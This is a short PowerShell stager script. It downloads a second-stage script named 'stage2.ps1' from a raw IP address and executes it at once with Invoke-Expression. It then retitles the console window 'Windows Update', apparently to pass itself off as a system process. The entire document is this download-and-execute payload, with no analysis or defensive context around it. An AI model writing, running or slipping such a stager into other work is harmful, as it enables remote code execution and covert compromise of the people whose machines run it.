
[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://203.0.113.69/stage2.ps1',
    [int]$StageTimeout = 58
)
IEX (Invoke-WebRequest -Uri $FetchUrl -UseBasicParsing).Content
$Host.UI.RawUI.WindowTitle = "Windows Update"
